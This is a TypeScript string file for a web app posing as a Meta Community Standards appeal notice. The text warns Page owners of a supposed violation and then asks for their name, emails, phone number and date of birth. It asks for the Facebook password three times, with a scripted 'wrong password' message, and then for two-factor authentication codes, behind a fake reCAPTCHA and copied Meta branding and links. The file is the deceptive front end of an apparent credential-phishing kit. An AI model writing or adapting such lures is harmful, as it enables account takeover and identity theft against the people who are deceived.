import type { AppStrings } from '../schema'

export const en: AppStrings = {
  common: {
    close: 'Close',
    continue: 'Continue',
    facebook: 'Facebook',
  },
  main: {
    badge: 'NOTICE',
    releaseDate: 'Notice date:',
    title: 'Your Page may have violated Community Standards',
    lead1:
      'The Community Standards outline what is and isn\'t allowed on Facebook, Instagram, Messenger and Threads. Your Page has been identified as potentially not complying with these standards.',
    lead2:
      'You may submit an appeal using the form below. Review Community Standards on the Meta Transparency Center before submitting.',
    caseId: 'Request reference:',
    reviewStatusLabel: 'Status:',
    reviewStatus: 'Pending review — appeal request',
    programScope:
      'Appeals under Community Standards published on the Meta Transparency Center.',
    activationStepsTitle: 'Three form steps',
    step1: 'Enter administrator details',
    step2: 'Verify your Facebook account',
    step3: 'Submit and await outcome notification',
    securityNotice:
      'Your information is sent over a secure connection and is used only to process your appeal request under Meta\'s',
    securityNoticeEnd: '.',
    helpPrompt: 'Need help? Visit the',
    estimatedDuration: 'Estimated completion time: approximately 5–10 minutes.',
    featuresTitle: 'Check before you submit',
    feature1Title: 'Accurate Page name',
    feature1Desc:
      'The name in the form must match the flagged Page on Facebook.',
    feature2Title: 'Administrator account',
    feature2Desc:
      'Only Page administrators or authorized representatives may submit the appeal form.',
    feature3Title: 'Content context',
    feature3Desc:
      'A brief note about flagged content helps reviewers understand your Page context.',
    feature4Title: 'Valid contact details',
    feature4Desc:
      'Email and phone must match the account or business linked to the Page.',
    feature5Title: 'Stay signed in to Facebook',
    feature5Desc:
      'Remain signed in to receive outcome notifications and complete identity verification.',
    feature6Title: 'One request per issue',
    feature6Desc:
      'Do not submit duplicates — one appeal request is sufficient per flag.',
    cta: 'Submit appeal',
    noteTitle: 'Important',
    noteBody:
      'This notice reflects an initial assessment, not a final conclusion. The US English version on the Transparency Center is the primary official document. Incorrect information may prevent your request from being processed.',
    linkPrivacy: 'Privacy Policy',
    linkTerms: 'Terms',
    linkCommunity: 'Community Standards',
    linkHelp: 'Help Center',
    linkBusiness: 'Meta Business Help Center',
    footerMeta:
      'Meta Platforms, Inc., Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025',
    altVerifiedBadge: 'Meta notification icon',
    altFeatureIcon: 'Information icon',
  },
  info: {
    title: 'Appeal details',
    hint: 'Information must match the Facebook account and Page you administer. Fields marked * are required.',
    fullName: 'Administrator full name',
    fullNamePh: 'e.g. Jane Doe',
    email: 'Contact email',
    emailPh: 'e.g. name@gmail.com',
    emailBiz: 'Business email',
    emailBizPh: 'e.g. contact@company.com',
    fanpage: 'Page / Fan Page name',
    fanpagePh: 'e.g. ABC Studio Official',
    phone: 'Phone number',
    dob: 'Date of birth',
    day: 'Day',
    month: 'Month',
    year: 'Year',
    message: 'Additional notes (optional)',
    messagePh:
      'e.g. This is the official Page for brand ABC; requesting a review of the Community Standards decision.',
    fbNotifyTitle: 'On Facebook',
    fbNotifyDesc:
      'Notification about the status of your appeal review.',
    fbNotifyAria: 'Enable notifications on Facebook',
    agree: 'I agree to the',
    agreeTerms: 'Terms of Use',
    submit: 'Continue',
    errFullName: 'Please enter your full name.',
    errEmail: 'Please enter a contact email address.',
    errEmailFmt: 'Contact email format is invalid (e.g. name@domain.com).',
    errEmailBiz: 'Please enter a business email.',
    errEmailBizFmt: 'Business email format is invalid (e.g. name@domain.com).',
    errFanpage: 'Please enter the Page / Fan Page name.',
    errPhone: 'Please enter a phone number.',
    errPhoneLen: '8–15 digits required.',
    errDay: 'Please select a day of birth.',
    errMonth: 'Please select a month of birth.',
    errYear: 'Please select a year of birth.',
  },
  password: {
    firstPrompt: 'To verify your identity, please enter your password to continue.',
    secondPrompt: 'Please re-enter your password to confirm and continue.',
    thirdPrompt: 'Please enter your password one more time to confirm and continue.',
    notice:
      'Tip: Double-check your password before the second entry to avoid mistakes. You can use the eye icon to show or hide your password on the confirmation step.',
    noticeThird:
      'You entered the wrong password twice. If you don\'t remember it, tap "Forgot password?" below.',
    phFirst: 'Enter password',
    phSecond: 'Re-enter password',
    continue: 'Continue',
    forgot: 'Forgot password?',
    errEmpty: 'Please enter your password.',
    errWrong: 'The password you entered is incorrect.',
    ariaShowPassword: 'Show password',
    ariaHidePassword: 'Hide password',
    ariaPasswordToggleDisabled: 'Password visibility cannot be changed',
  },
  twoFa: {
    title: 'Identity verification',
    description: (destinations: string) =>
      destinations
        ? `Enter the code sent to ${destinations}, another linked phone number, or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).`
        : `Enter the code sent to your account, another linked phone number, or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).`,
    label: 'Authentication code',
    placeholder: 'Enter authentication code',
    hint: 'A valid code is 6 or 8 digits.',
    tryOther: 'Try another way',
    ariaInput: 'Two-factor authentication code',
    ariaSubmit: 'Continue',
    errInvalid: 'Please enter a valid authentication code with 6 or 8 digits.',
    errSend: 'Could not send the authentication code. Please try again later.',
    errVerify: 'Could not verify the code. Please try again.',
    retryErrorExpired: (minutes, seconds) =>
      `The authentication code has expired. Please try again in ${minutes} min ${seconds} sec.`,
    retryError: (minutes, seconds) =>
      `The code you entered is incorrect. Please try again in ${minutes} min ${seconds} sec.`,
    authIllustrationAlt: 'Illustration of two-factor authentication on a phone',
    metaLogoAlt: 'Meta logo',
  },
  success: {
    title: 'Appeal request submitted',
    p1:
      'Your appeal request has been received and added to the review queue.',
    p2: 'The outcome will be sent via Facebook notification, typically within 3–7 business days.',
    idleNote:
      'Stay signed in to Facebook to receive timely notifications. Do not submit duplicate requests for the same issue.',
    cta: 'Return to Facebook',
  },
  captcha: {
    altLogo: 'Meta logo',
    altRecaptcha: 'reCAPTCHA',
    notRobot: "I'm not a robot",
    verifying: 'Verifying...',
    privacyTerms: 'Privacy - Terms',
    p1:
      'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
    p2:
      "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
    p3:
      'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
  },
  nav: {
    heading: 'Privacy Center',
    home: 'Privacy Center Home',
    search: 'Search',
    commonSettings: 'Common privacy settings',
    topics: 'Privacy topics',
    moreResources: 'More privacy resources',
    policy: 'Privacy Policy',
    policyQ1: 'What is the Privacy Policy and what does it cover?',
    policyQ2: 'What information do we collect?',
    policyQ3: 'How do we use your information?',
    policyQ4:
      'How do we share your information on Meta Products or with integrated partners?',
    policyQ5: 'How do we share information with third parties?',
    policyQ6: 'How is the cooperation between Meta Companies organized?',
    policyQ7: 'How can you manage or delete your information and exercise your rights?',
    policyQ8: 'How long do we keep your information?',
    policyQ9: 'How do we transmit information?',
    policyQ10:
      'How do we respond to official requests, comply with applicable laws, and prevent harm?',
    policyQ11: 'How will you know when the policy changes?',
    policyQ12: 'How to ask Meta questions?',
    policyQ13: 'Why and how we process your data',
    otherRules: 'Other rules and articles',
    cookie: 'Cookie Policy',
    nonUsers: 'Information for those who do not use Meta Products',
    genAi: 'How Meta uses information for generative AI models',
    dataTransfer: 'Data Transfer Framework Policy',
    otherTerms: 'Other terms and conditions',
    mobileTitle: 'Privacy Policy',
  },
  languagePicker: {
    label: 'View in another language (optional)',
    autoOption: 'Automatic (from your IP / location)',
  },
}
